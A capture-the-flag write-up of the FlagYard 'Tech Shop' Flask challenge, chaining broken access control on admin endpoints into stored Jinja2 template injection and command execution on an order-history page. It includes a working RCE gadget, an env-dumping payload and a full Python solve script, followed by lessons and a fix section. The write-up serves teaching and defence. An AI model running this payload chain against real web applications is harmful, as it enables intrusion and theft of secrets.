@@ -1,0 +1,144 @@
+---
+title: "FlagYard — Tech Shop"
+description: "Broken access control lets any user rewrite a product's description and top up their balance — then a second, unsafe render of that description in the order-history page turns it into Jinja2 SSTI and RCE."
+date: 2026-07-23T13:43:11Z
+tags: ["ctf", "web", "flagyard", "idor", "ssti", "jinja2", "rce", "flask"]
+draft: false
+---
+
+**Tech Shop** is a Flask "e-commerce" app (products, cart, balance, order history). It hands you an obvious IDOR and an obvious SSTI attempt that *looks* like a dead end. The trick is that the same user-controlled field is rendered in two different places — one safe, one not.
+
+## The Setup
+
+The `/shop` page ships a JS comment block that basically hands you the internal API:
+
+```javascript
+const internalEndpoints = {
+    // Admin endpoints
+    updateBalance: '/update_balance/<user_id>', // POST balance=<amount>
+    editProduct:   '/edit_product/<product_id>' // POST description=<text>
+};
+```
+
+Both are labelled "admin only". Neither actually checks your role.
+
+## Step 1 — Broken Access Control (IDOR)
+
+Logged in as a normal user, both endpoints work and just trust the path parameter:
+
+```
+POST /edit_product/7      description=hello      → 302, product 7's description changes
+POST /update_balance/<me> balance=1000000        → 302, my balance becomes $1,000,000
+```
+
+No privilege check anywhere. That's the enabler — but on its own it's just "vandalise a product / give yourself money".
+
+## Step 2 — The SSTI That Looks Dead
+
+The natural next move is template injection through the description. On `/shop` it flatly refuses:
+
+```html
+<p class="card-text">{{7*7}}</p>
+```
+
+`{{7*7}}` renders **literally**. The product listing uses `{{ product.description }}` with normal autoescaping (`render_template`) — not a template-injection sink. Easy to conclude SSTI is off the table here. It isn't.
+
+## Step 3 — Find the Second Render
+
+Enumerating the app turns up `/profile/<id>`. Most profiles are ~2 KB; the seeded admin's profile is ~8.8 KB because it renders an **Order History** table — and each row echoes the purchased product's description again:
+
+```html
+<td>
+    Gaming Laptop
+    <small class="text-muted d-block">
+        High-performance gaming laptop   <!-- product.description, rendered a SECOND time -->
+    </small>
+</td>
+```
+
+Same field, second render point. If this one interpolates through `render_template_string`, it's injectable even though `/shop` isn't.
+
+## Step 4 — Chain It
+
+To get my own tainted description into *my* order history:
+
+1. `POST /edit_product/7` `description={{7*7}}` — plant the payload (IDOR).
+2. `POST /update_balance/<me>` `balance=1000000` — afford checkout (IDOR).
+3. `GET /add_to_cart/7` → `GET /checkout` — buy it, snapshotting the product into my orders.
+4. `GET /profile/<me>` — the order-history table re-renders the description.
+
+The `<small>` block came back as:
+
+```
+49
+```
+
+`{{7*7}}` evaluated. SSTI confirmed on the profile sink.
+
+## Step 5 — SSTI to RCE
+
+The Jinja2 context isn't sandboxed, so a compact global-walk gadget gets command execution. Set the description to:
+
+```jinja2
+{{ cycler.__init__.__globals__.os.popen('id; env | grep -i flag').read() }}
+```
+
+Buy again, reload the profile, and the order-history row renders:
+
+```
+uid=1000 gid=1000 groups=1000
+DYN_FLAG=FlagY{...}
+```
+
+The flag isn't on disk (`cat /flag*` finds nothing) — it's injected as the `DYN_FLAG` environment variable, so `env` pulls it.
+
+## Flag
+
+```
+FlagY{...}
+```
+
+## Full Solve Script
+
+```python
+import requests, re, random
+B = "http://<instance>.playat.flagyard.com"   # HTTP :80 — NOT https (443 black-holes)
+s = requests.Session()
+u, p = "pwn%d" % random.randint(1000, 9999), "pwn12345"
+s.post(B + "/register", data={"username": u, "password": p})
+s.post(B + "/login",    data={"username": u, "password": p})
+myid = re.search(r'profile/(\d+)', s.get(B + "/shop").text).group(1)
+
+# IDOR: fund the account + plant the SSTI payload in a product's description
+s.post(B + "/update_balance/" + myid, data={"balance": "1000000"})
+payload = "{{ cycler.__init__.__globals__.os.popen('env | grep -i flag').read() }}"
+s.post(B + "/edit_product/7", data={"description": payload})
+
+# Buy it -> snapshots into order history -> triggers render_template_string
+s.get(B + "/add_to_cart/7")
+s.get(B + "/checkout")
+print(s.get(B + "/profile/" + myid).text[…])   # flag appears in the order-history <small> block
+```
+
+## Why It Works
+
+The same stored value hits two sinks with different safety. `/shop` uses `{{ product.description }}` under autoescaping, so injection is inert. The profile's order-history template builds its output with `render_template_string`, so the *stored* description is parsed as a Jinja2 template every time the page loads. IDOR gives write access to that stored value; the second render turns it into code execution.
+
+## What I Did Wrong
+
+- Spent time convinced my tooling was broken when `https://` requests hung. The instance only listens on **HTTP :80** — 443 just times out. One TCP connect per port would have caught it immediately.
+- Nearly wrote SSTI off after `/shop` rendered `{{7*7}}` literally, instead of asking *where else* the same field is displayed.
+
+## What I Learned
+
+- When one render point escapes your payload, hunt for a **second** place the same data is shown before abandoning the bug class. Order-history / receipt / invoice pages are classic unsafe re-render sinks.
+- IDOR is often the enabler, not the finish line — here it only mattered because it fed a second, unsafe render.
+- Flags aren't always files. Always dump `env` alongside `cat /flag*`.
+- `cycler.__init__.__globals__.os` is a tidy Jinja2 RCE gadget when the `cycler`/`joiner`/`namespace` globals are in scope — no `__subclasses__()` walking needed.
+
+## The Fix
+
+- Enforce authorization server-side on `/edit_product` and `/update_balance` (check the session's role, don't trust the path parameter).
+- Never feed stored user input to `render_template_string`. Render with `render_template` and pass the value as a context variable so it's autoescaped like every other field.
+
+*0xAdham*
